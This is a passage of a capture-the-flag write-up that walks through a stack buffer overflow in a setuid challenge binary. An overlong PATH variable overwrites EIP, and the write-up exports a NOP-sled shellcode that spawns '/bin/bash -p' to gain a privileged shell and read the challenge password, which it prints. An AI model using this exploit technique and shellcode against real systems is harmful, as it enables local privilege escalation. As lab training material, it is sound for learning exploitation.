```
$export PATH=$(/usr/bin/python -c 'print "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdd\xcc\xbb\xaa"')



(gdb) run
Starting program: /challenge/app-systeme/ch8/ch8 
[+] Getting env...

Program received signal SIGSEGV, Segmentation fault.
0xaabbccdd in ?? ()

```

**Boom!** We found **EIP**.
No we can set **EIP** to the address of some env variable containing the shellcode.
Let's use this [shellcode](http://shell-storm.org/shellcode/files/shellcode-606.php).

```
app-systeme-ch8@challenge02:~$ export SHELLCODE=$(python -c 'print("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')
app-systeme-ch8@challenge02:~$ /tmp/c8/findenv
shellcode	0xbffffce2
app-systeme-ch8@challenge02:~$ export PATH=$(/usr/bin/python -c 'print "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\xfc\xff\xbf\xff"')
app-systeme-ch8@challenge02:~$ ./ch8 
[+] Getting env...
bash-4.4$ cat .passwd
s2$srAkdAq18q
```
--------------------------------------------------------------------------------
### Resources

[Finding environment variables with gdb to exploit buffer overflows - Stack Overflow](https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow)